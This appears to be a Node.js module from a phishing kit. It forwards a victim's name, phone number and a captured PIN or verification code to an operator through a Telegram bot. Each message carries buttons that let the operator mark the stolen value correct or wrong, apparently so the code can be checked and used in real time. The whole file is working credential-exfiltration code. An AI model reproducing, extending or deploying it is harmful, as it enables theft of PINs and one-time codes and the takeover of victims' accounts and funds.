const axios = require('axios');
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

async function sendTelegramMessage({ type, name, phone, value }) {
    const text = type === 'PIN'
        ? `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${value}`
        : `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCODE: ${value}`;

    const reply_markup = {
        inline_keyboard: type === 'PIN'
            ? [[
                { text: '✅ Correct PIN', callback_data: `correct_pin:${value}` },
                { text: '❌ Wrong PIN', callback_data: `wrong_pin:${value}` }
              ]]
            : [[
                { text: '✅ Correct Code', callback_data: `correct_code:${value}` },
                { text: '❌ Wrong Code', callback_data: `wrong_code:${value}` }
              ]]
    };

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const res = await axios.post(url, { chat_id: CHAT_ID, text, reply_markup });
    console.log('✅ Telegram message sent:', res.data);
}

module.exports = { sendTelegramMessage };
